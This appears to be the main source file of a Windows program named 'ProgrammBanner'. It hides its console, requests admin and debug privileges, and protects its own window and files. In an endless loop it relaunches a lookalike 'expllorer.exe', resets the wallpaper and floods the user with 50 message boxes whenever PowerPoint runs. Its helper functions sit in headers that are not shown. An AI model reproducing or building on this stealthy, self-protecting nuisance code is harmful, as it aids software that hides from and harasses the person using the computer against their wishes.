#include"../process.h"
#include"console.h"
#include"MustInclude.h"
#include"GeneralTask.h"
void Fuck(){

	int cnt=50;
	while(cnt--){
		MessageBoxA(NULL,"Don't use it(PPT).I've already warned you.","Warning",MB_OK);
	}
}

int main () {//完全R3
	HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
	if(getPid("ProgrammBanner").size()>MAX_RUNNING_INSTANCE){return 1;}
	RequestAdminRightsWithArgs();
	
	//FreeConsole();
	EnableDebugPrivilege();
	setWindowProtection();
	
	while(1){
		if(!isProcessExist(getSinglePid("expllorer"))){LaunchExe("expllorer.exe");}
		if(isProcessExist(getSinglePid("POWERPNT"))){Fuck();}
		FileProtect();
		SetWallPaper(WALLPAPER_PATH);
		//system("sc start WFI");
		Sleep(1650);
	}
	return 0;
}